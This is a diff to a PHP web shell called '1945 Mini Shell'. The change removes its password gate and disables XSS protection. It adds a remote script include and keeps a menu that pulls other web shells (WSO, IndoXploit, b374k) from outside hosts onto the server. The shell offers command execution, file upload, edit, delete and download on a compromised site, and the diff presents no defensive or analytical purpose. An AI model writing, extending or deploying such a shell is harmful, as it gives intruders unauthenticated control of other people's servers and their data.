@@ -6,23 +6,15 @@
 */
 error_reporting(0);
 set_time_limit(0);
-$passwordMiNi1945 = "1945mini";
+header("X-XSS-Protection: 0");
+
 $are=array("adminer"=>"https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
 			"idx3"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php",
 			"1945v2017"=>"https://raw.githubusercontent.com/alintamvanz/1945shell/master/ext/1945.php",
 			"wso"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php",
-			"b374k"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php");
-	if(isset($passwordMiNi1945)&&empty($_COOKIE[md5($_SERVER['HTTP_HOST'])]))
-	{
-		echo "<title>Forbidden</title><center><h1>Forbidden</h1><hr>Nginx 1.10.1</center>";
-		if(isset($_GET['pass'])){
-			if($_GET['pass']==$passwordMiNi1945){
-				setcookie(md5($_SERVER['HTTP_HOST']),md5($passwordMiNi1945));
-				echo "<meta http-equiv='refresh' content='0;url='>";
-			}
-		}
-		exit();
-	}
+			"b374k"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php",
+			"jquery" => "https://alintamvanz.github.io/jshell/jquery.min.js");
+
 function getpath()
 {
 	if(isset($_GET['d']))
@@ -175,25 +167,27 @@ $gp=getpath();
 	<title>1945 Mini Shell</title>
 <meta name="author" content="shutdown57">
 <link rel="icon" type="text/css" href="https://raw.githubusercontent.com/alintamvanz/alintamvanz.github.io/master/images/favicon_1945.gif">
+<script type="text/javascript" src="<?=$are['jquery'];?>"></script>
 </head>
 <style type="text/css">
 	body{background:#333;color:#eee}
-	.table{border: 1px solid #00e4ff;width:800px;border-collapse: collapse;}
-	.table tr{border-bottom: 1px solid #fff}a{text-decoration: none;color:#eee;}a:hover{color: #00e4ff}.table tr:hover{background:#666}hr{border: 1px solid #00e4ff}.in{display: inline-block;}select,option,input,textarea{background:#333;color:#eee;border: 1px solid #00e4ff}textarea{width:700px;height: 500px;margin: 0 auto;}
+	.table{border: 1px solid #f00;width:800px;border-collapse: collapse;}
+	.table tr{border-bottom: 1px solid #fff}a{text-decoration: none;color:#eee;}a:hover{color: #f00}.table tr:hover{background:#666}hr{border: 1px solid #f00}.in{display: inline-block;margin-left:10px;margin-right:10px}select,option,input,textarea{background:#333;color:#eee;border: 1px solid #f00}textarea{width:700px;height: 500px;margin: 0 auto;}
 </style>
 <body>
 <center>
-<a href="?"><h1>1945 Mini Shell</h1></a>
+<a href="<?=$_SERVER['PHP_SELF'];?>"><h1>1945 Mini Shell</h1></a>
+[<font color=pink><?=php_uname();?></font>]
 </center>
 <hr><div class="in">
 <form class="in" method="get">Kuchiyose no jutsu : 
-	<select name="a">
+	<select name="a" onchange="this.form.submit();">
 		<option value="">Kuchiyose</option>
 		<option value="wso">WSO 2.5</option><option value="idx3">IndoXploit v3</option><option value="1945v2017">1945v2017</option><option value="b374k">b374k 2.8</option><option value="adminer">Adminer</option>
-	</select><input type="submit" value=">>">
+	</select>
 </form>
-<form method="post" class="in" enctype="multipart/form-data" action="?d=<?=$gp;?>&a=upload"> Upload file :<input type="file" name="filup[]" multiple="" style="border: 0"><input type="submit" name="upload" value=">>"></form><form method="post" action="?d=<?=$gp;?>&a=cmd" class="in"> Command : <input type="text" name="cmd"><input type="submit" value=">>"></form>
-<form method=get class="in">go to dir : <input type="text" name="d" value="<?=$gp;?>"><input type="submit" value=">>"></form><form method="get" class="in">Act? : <select name="a"><option value="logout">LogOut</option><option value="kill">Kill Self</option><option value="shell">Shell</option></select><input type="submit" value=">>"></form>
+<form method="post" class="in" enctype="multipart/form-data" action="?d=<?=$gp;?>&a=upload"> Upload file :<input type="file" name="filup[]" multiple="" style="border: 0"><input type="submit" name="upload" value=">>"></form><form method="post" action="?d=<?=$gp;?>&a=cmd" class="in"> Command : <input type="text" name="cmd"></form>
+<form method=get class="in">go to dir : <input type="text" name="d" value="<?=$gp;?>"><input type="submit" value=">>"></form><form method="get" class="in">Act? : <select name="a" onchange="this.form.submit();"><option>---</option><option value="logout">LogOut</option><option value="kill">Kill Self</option><option value="shell">Shell</option></select></form>
 </div>
 <hr>
 <?php
@@ -212,7 +206,7 @@ foreach($dir as $d1)
 	<td><?=getsize("$gp/$d1");?></td>
 	<td><?=getowner("$gp/$f1");?>:<?=getgroup("$gp/$f1");?></td>
 	<td><?=getperms("$gp/$d1");?></td>
-	<td align="right"><a href="?d=<?="$gp/$d1"?>&a=rename">rename</a> | <a href="?d=<?="$gp/$d1"?>&a=delete">delete</a></td>
+	<td align="right"><a href="?d=<?="$gp/$d1"?>&a=rename">ren</a> | <a href="?d=<?="$gp/$d1"?>&a=delete">del</a></td>
 	</tr>
 	<?php
 }
@@ -225,10 +219,10 @@ foreach($dir as $f1)
 	<td><?=getowner("$gp/$f1");?>:<?=getgroup("$gp/$f1");?></td>
 	<td><?=getperms("$gp/$f1");?></td>
 	<td align="right">
-	<a href="?d=<?=$gp;?>&a=rename&f=<?=$f1;?>">rename</a> |
-	<a href="?d=<?="$gp/$f1";?>&a=delete">delete</a> |
+	<a href="?d=<?=$gp;?>&a=rename&f=<?=$f1;?>">ren</a> |
+	<a href="?d=<?="$gp/$f1";?>&a=delete">del</a> |
 	<a href="?d=<?=$gp;?>&a=edit&f=<?=$f1;?>">edit</a> |
-	<a href="?d=<?=$gp;?>&a=download&f=<?=$f1;?>">download</a></td>
+	<a href="?d=<?=$gp;?>&a=download&f=<?=$f1;?>">dl</a></td>
 	</tr>
 	<?php
 }
